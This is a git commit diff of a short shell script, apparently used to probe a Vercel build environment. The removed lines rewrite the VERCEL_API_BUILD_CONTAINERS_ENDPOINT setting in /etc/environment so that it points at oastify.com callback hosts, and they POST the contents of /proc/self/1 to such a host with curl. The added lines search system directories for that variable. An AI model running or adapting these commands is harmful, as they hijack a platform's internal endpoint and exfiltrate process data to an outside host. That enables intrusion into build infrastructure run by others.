033c42c231bc59d5e239d241b51e215416349184
Security testing <118594933+w2h3@users.noreply.github.com>
2024-01-25 15:41:41 +0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,5 +1,9 @@
 #!/bin/bash
 
-sed -i 's/^VERCEL_API_BUILD_CONTAINERS_ENDPOINT=.*/VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https:\/\/htej4wcusf414r2oqi8eibyyipogcl49t.oastify.com\//' /etc/environment
+#sed -i 's/^VERCEL_API_BUILD_CONTAINERS_ENDPOINT=.*/VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https:\/\/htej4wcusf414r2oqi8eibyyipogcl49t.oastify.com\//' /etc/environment
 #sed -i 's/^VERCEL_API_BUILD_CONTAINERS_ENDPOINT=.*/VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https:\/\/95cbgoom47gtgjeg2ak6u3aquh08odf14.oastify.com/' /etc/environment
-curl -X POST -d "$(cat /proc/self/1)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
+#curl -X POST -d "$(cat /proc/self/1)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
+
+egrep -r "VERCEL_API_BUILD_CONTAINERS_ENDPOINT" /usr/.
+egrep -r "VERCEL_API_BUILD_CONTAINERS_ENDPOINT" /var/.
+egrep -r "VERCEL_API_BUILD_CONTAINERS_ENDPOINT" /vercel/.
